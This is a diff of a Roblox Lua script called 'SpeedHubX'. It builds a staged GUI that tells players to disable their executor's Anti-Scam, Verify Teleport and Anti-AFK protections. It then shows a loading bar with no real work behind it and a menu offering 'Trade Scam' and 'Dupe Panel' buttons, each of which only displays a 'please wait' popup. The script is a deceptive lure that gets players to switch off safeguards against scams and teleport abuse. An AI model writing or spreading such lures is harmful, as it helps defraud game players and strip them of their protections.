@@ -1,202 +1,174 @@
---// SpeedHubX GUI Flow Script
+--// SpeedHubX UI Script
 
--- Starter UI library
-local TweenService = game:GetService("TweenService")
+-- Panel 1: Instruction Window
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
 
--- Helper function to create UI elements quickly
-local function create(class, props, parent)
-    local inst = Instance.new(class)
-    for k,v in pairs(props) do
-        inst[k] = v
-    end
-    inst.Parent = parent
-    return inst
-end
+local Panel1 = Instance.new("Frame", ScreenGui)
+Panel1.Size = UDim2.new(0, 400, 0, 250)
+Panel1.Position = UDim2.new(0.5, -200, 0.5, -125)
+Panel1.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Panel1.BorderSizePixel = 0
 
--- Main ScreenGui
-local screenGui = create("ScreenGui", {Name = "SpeedHubXGui", ResetOnSpawn = false}, game.CoreGui)
+local Title = Instance.new("TextLabel", Panel1)
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "Turn off all the following Delta settings, or the script will fail."
+Title.Font = Enum.Font.SourceSansBold
+Title.TextSize = 18
+Title.TextColor3 = Color3.fromRGB(255, 0, 0)
+Title.TextWrapped = true
 
----------------------------------------------------
--- PANEL 1: Instructions + Checkbox + Confirm
----------------------------------------------------
-local panel1 = create("Frame", {
-    Size = UDim2.new(0, 400, 0, 300),
-    Position = UDim2.new(0.5, -200, 0.5, -150),
-    BackgroundColor3 = Color3.fromRGB(30,30,30),
-    BorderSizePixel = 0,
-    Visible = true
-}, screenGui)
+local Instructions = Instance.new("TextLabel", Panel1)
+Instructions.Size = UDim2.new(1, -20, 0, 120)
+Instructions.Position = UDim2.new(0, 10, 0, 50)
+Instructions.BackgroundTransparency = 1
+Instructions.Text = "1. Disable Anti-AFK\n2. Disable Verify Teleport\n3. Disable Anti-Scam\n\nAfter disabling, check the box then press Confirm."
+Instructions.Font = Enum.Font.SourceSans
+Instructions.TextSize = 16
+Instructions.TextColor3 = Color3.fromRGB(255, 255, 255)
+Instructions.TextWrapped = true
+Instructions.TextXAlignment = Enum.TextXAlignment.Left
+Instructions.TextYAlignment = Enum.TextYAlignment.Top
 
-create("UICorner", {CornerRadius = UDim.new(0,8)}, panel1)
+local CheckBox = Instance.new("TextButton", Panel1)
+CheckBox.Size = UDim2.new(0, 20, 0, 20)
+CheckBox.Position = UDim2.new(0, 20, 1, -40)
+CheckBox.Text = ""
+CheckBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
 
-local title = create("TextLabel", {
-    Size = UDim2.new(1, -20, 0, 40),
-    Position = UDim2.new(0, 10, 0, 10),
-    BackgroundTransparency = 1,
-    Text = "Turn off all the following Delta settings, or the script will fail.",
-    TextColor3 = Color3.fromRGB(255,0,0),
-    Font = Enum.Font.SourceSansBold,
-    TextScaled = true,
-    TextWrapped = true
-}, panel1)
-
-local instructions = create("TextLabel", {
-    Size = UDim2.new(1, -20, 0, 120),
-    Position = UDim2.new(0, 10, 0, 60),
-    BackgroundTransparency = 1,
-    Text = "• Disable Anti-AFK\n• Disable Verify Teleport\n• Disable Anti-Scam\n\nAfter disabling, check the box to continue.",
-    TextColor3 = Color3.fromRGB(255,255,255),
-    Font = Enum.Font.SourceSans,
-    TextSize = 20,
-    TextWrapped = true,
-    TextYAlignment = Enum.TextYAlignment.Top
-}, panel1)
-
-local checkbox = create("TextButton", {
-    Size = UDim2.new(0, 30, 0, 30),
-    Position = UDim2.new(0, 20, 1, -50),
-    BackgroundColor3 = Color3.fromRGB(50,50,50),
-    Text = ""
-}, panel1)
-
-local cbMark = create("TextLabel", {
-    Size = UDim2.new(1,0,1,0),
-    BackgroundTransparency = 1,
-    Text = "✓",
-    TextColor3 = Color3.fromRGB(0,255,0),
-    Font = Enum.Font.SourceSansBold,
-    TextScaled = true,
-    Visible = false
-}, checkbox)
-
-local confirmBtn = create("TextButton", {
-    Size = UDim2.new(0, 100, 0, 40),
-    Position = UDim2.new(1, -120, 1, -50),
-    BackgroundColor3 = Color3.fromRGB(100,100,100),
-    Text = "Confirm",
-    TextColor3 = Color3.fromRGB(255,255,255),
-    Font = Enum.Font.SourceSansBold,
-    TextScaled = true,
-    AutoButtonColor = false
-}, panel1)
-confirmBtn.Active = false
-
-local cbChecked = false
-checkbox.MouseButton1Click:Connect(function()
-    cbChecked = not cbChecked
-    cbMark.Visible = cbChecked
-    if cbChecked then
-        confirmBtn.BackgroundColor3 = Color3.fromRGB(0,170,0)
-        confirmBtn.Active = true
-    else
-        confirmBtn.BackgroundColor3 = Color3.fromRGB(100,100,100)
-        confirmBtn.Active = false
-    end
+local Checked = false
+CheckBox.MouseButton1Click:Connect(function()
+    Checked = not Checked
+    CheckBox.BackgroundColor3 = Checked and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(50, 50, 50)
 end)
 
----------------------------------------------------
--- PANEL 2: Warning Popup
----------------------------------------------------
-local panel2 = create("Frame", {
-    Size = UDim2.new(0, 380, 0, 150),
-    Position = UDim2.new(0.5, -190, 0.5, -75),
-    BackgroundColor3 = Color3.fromRGB(50,0,0),
-    BorderSizePixel = 0,
-    Visible = false
-}, screenGui)
-create("UICorner", {CornerRadius = UDim.new(0,8)}, panel2)
+local ConfirmBtn = Instance.new("TextButton", Panel1)
+ConfirmBtn.Size = UDim2.new(0, 100, 0, 30)
+ConfirmBtn.Position = UDim2.new(1, -120, 1, -40)
+ConfirmBtn.Text = "Confirm"
+ConfirmBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+ConfirmBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-local warnLabel = create("TextLabel", {
-    Size = UDim2.new(1, -20, 1, -20),
-    Position = UDim2.new(0, 10, 0, 10),
-    BackgroundTransparency = 1,
-    Text = "Your executor might still have Verify Teleport / Anti-Scam enabled. Please disable these.\nREJOIN for the script to take effect",
-    TextColor3 = Color3.fromRGB(255,255,255),
-    Font = Enum.Font.SourceSansBold,
-    TextWrapped = true,
-    TextScaled = true
-}, panel2)
+ConfirmBtn.MouseButton1Click:Connect(function()
+    if Checked then
+        Panel1:Destroy()
 
----------------------------------------------------
--- PANEL 3: Loading Screen
----------------------------------------------------
-local panel3 = create("Frame", {
-    Size = UDim2.new(0, 400, 0, 200),
-    Position = UDim2.new(0.5, -200, 0.5, -100),
-    BackgroundColor3 = Color3.fromRGB(20,20,20),
-    BorderSizePixel = 0,
-    Visible = false
-}, screenGui)
-create("UICorner", {CornerRadius = UDim.new(0,8)}, panel3)
+        -- Panel 2: Warning Popup
+        local Panel2 = Instance.new("Frame", ScreenGui)
+        Panel2.Size = UDim2.new(0, 350, 0, 120)
+        Panel2.Position = UDim2.new(0.5, -175, 0.5, -60)
+        Panel2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        Panel2.BorderSizePixel = 0
 
-local loadLabel = create("TextLabel", {
-    Size = UDim2.new(1,0,0,50),
-    Position = UDim2.new(0,0,0,20),
-    BackgroundTransparency = 1,
-    Text = "Loading GAG Script",
-    TextColor3 = Color3.fromRGB(255,255,255),
-    Font = Enum.Font.SourceSansBold,
-    TextScaled = true
-}, panel3)
+        local Warning = Instance.new("TextLabel", Panel2)
+        Warning.Size = UDim2.new(1, -20, 1, -20)
+        Warning.Position = UDim2.new(0, 10, 0, 10)
+        Warning.BackgroundTransparency = 1
+        Warning.TextWrapped = true
+        Warning.Text = "Your executor might still have Verify Teleport / Anti-Scam enabled.\nPlease disable these.\n\nThis message will close automatically..."
+        Warning.TextColor3 = Color3.fromRGB(255, 255, 0)
+        Warning.TextSize = 16
+        Warning.Font = Enum.Font.SourceSansBold
 
-local progressBar = create("Frame", {
-    Size = UDim2.new(0,0,0,20),
-    Position = UDim2.new(0,0,0.5,0),
-    BackgroundColor3 = Color3.fromRGB(0,170,255)
-}, panel3)
-create("UICorner", {CornerRadius = UDim.new(0,8)}, progressBar)
+        task.wait(5)
+        Panel2:Destroy()
 
-local percentage = create("TextLabel", {
-    Size = UDim2.new(1,0,0,30),
-    Position = UDim2.new(0,0,1,-40),
-    BackgroundTransparency = 1,
-    Text = "0%",
-    TextColor3 = Color3.fromRGB(255,255,255),
-    Font = Enum.Font.SourceSansBold,
-    TextScaled = true
-}, panel3)
+        -- Panel 3: Loading Screen
+        local Panel3 = Instance.new("Frame", ScreenGui)
+        Panel3.Size = UDim2.new(0, 350, 0, 150)
+        Panel3.Position = UDim2.new(0.5, -175, 0.5, -75)
+        Panel3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        Panel3.BorderSizePixel = 0
 
----------------------------------------------------
--- PANEL 4: Final Window UI
----------------------------------------------------
-local panel4 = create("Frame", {
-    Size = UDim2.new(0, 500, 0, 350),
-    Position = UDim2.new(0.5, -250, 0.5, -175),
-    BackgroundColor3 = Color3.fromRGB(25,25,25),
-    BorderSizePixel = 0,
-    Visible = false
-}, screenGui)
-create("UICorner", {CornerRadius = UDim.new(0,8)}, panel4)
+        local LoadText = Instance.new("TextLabel", Panel3)
+        LoadText.Size = UDim2.new(1, 0, 0, 40)
+        LoadText.Position = UDim2.new(0, 0, 0, 20)
+        LoadText.BackgroundTransparency = 1
+        LoadText.Text = "Loading GAG Script..."
+        LoadText.Font = Enum.Font.SourceSansBold
+        LoadText.TextSize = 20
+        LoadText.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-local panel4title = create("TextLabel", {
-    Size = UDim2.new(1,0,0,50),
-    BackgroundTransparency = 1,
-    Text = "SpeedHubX - Auto Middle",
-    TextColor3 = Color3.fromRGB(0,170,255),
-    Font = Enum.Font.SourceSansBold,
-    TextScaled = true
-}, panel4)
+        local ProgressBar = Instance.new("Frame", Panel3)
+        ProgressBar.Size = UDim2.new(0, 0, 0, 20)
+        ProgressBar.Position = UDim2.new(0, 0, 0, 80)
+        ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+        ProgressBar.BorderSizePixel = 0
 
----------------------------------------------------
--- Button Actions
----------------------------------------------------
-confirmBtn.MouseButton1Click:Connect(function()
-    if not cbChecked then return end
-    panel1.Visible = false
-    panel2.Visible = true
+        local Percent = Instance.new("TextLabel", Panel3)
+        Percent.Size = UDim2.new(1, 0, 0, 20)
+        Percent.Position = UDim2.new(0, 0, 0, 110)
+        Percent.BackgroundTransparency = 1
+        Percent.Text = "0%"
+        Percent.Font = Enum.Font.SourceSans
+        Percent.TextSize = 16
+        Percent.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    task.delay(5, function()
-        panel2.Visible = false
-        panel3.Visible = true
-
-        -- Fake loading for 5 seconds
         for i = 1, 100 do
-            progressBar.Size = UDim2.new(i/100, 0, 0, 20)
-            percentage.Text = tostring(i).."%"
+            ProgressBar.Size = UDim2.new(i/100, 0, 0, 20)
+            Percent.Text = i.."%"
             task.wait(0.05)
         end
 
-        panel3.Visible = false
-        panel4.Visible = true
-    end)
+        Panel3:Destroy()
+
+        -- Panel 4: Final UI
+        local Panel4 = Instance.new("Frame", ScreenGui)
+        Panel4.Size = UDim2.new(0, 500, 0, 300)
+        Panel4.Position = UDim2.new(0.5, -250, 0.5, -150)
+        Panel4.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+        Panel4.BorderSizePixel = 0
+
+        local Header = Instance.new("TextLabel", Panel4)
+        Header.Size = UDim2.new(1, 0, 0, 40)
+        Header.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        Header.Text = "SpeedHubX"
+        Header.Font = Enum.Font.SourceSansBold
+        Header.TextSize = 22
+        Header.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+        local Buttons = {"Trade Scam", "Dupe Panel", "ESP EGG & RANDOMIZER", "Settings"}
+        for i, name in ipairs(Buttons) do
+            local Btn = Instance.new("TextButton", Panel4)
+            Btn.Size = UDim2.new(0, 150, 0, 40)
+            Btn.Position = UDim2.new(0, 20, 0, 40 + (i-1)*50)
+            Btn.Text = name
+            Btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+            Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+            Btn.Font = Enum.Font.SourceSansBold
+            Btn.TextSize = 18
+
+            Btn.MouseButton1Click:Connect(function()
+                local Popup = Instance.new("Frame", ScreenGui)
+                Popup.Size = UDim2.new(0, 300, 0, 100)
+                Popup.Position = UDim2.new(0.5, -150, 0.5, -50)
+                Popup.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+                Popup.BorderSizePixel = 0
+
+                local Label = Instance.new("TextLabel", Popup)
+                Label.Size = UDim2.new(1, -20, 1, -20)
+                Label.Position = UDim2.new(0, 10, 0, 10)
+                Label.BackgroundTransparency = 1
+                Label.TextWrapped = true
+                Label.Text = "Please wait for the \""..name.."\" to load"
+                Label.TextColor3 = Color3.fromRGB(255, 255, 255)
+                Label.TextSize = 18
+                Label.Font = Enum.Font.SourceSansBold
+
+                task.wait(3)
+                Popup:Destroy()
+            end)
+        end
+
+        local Footer = Instance.new("TextLabel", Panel4)
+        Footer.Size = UDim2.new(1, -10, 0, 20)
+        Footer.Position = UDim2.new(0, 5, 1, -25)
+        Footer.BackgroundTransparency = 1
+        Footer.Text = "Made By SpeedHubX"
+        Footer.Font = Enum.Font.SourceSans
+        Footer.TextSize = 14
+        Footer.TextColor3 = Color3.fromRGB(200, 200, 200)
+        Footer.TextXAlignment = Enum.TextXAlignment.Right
+    end
 end)
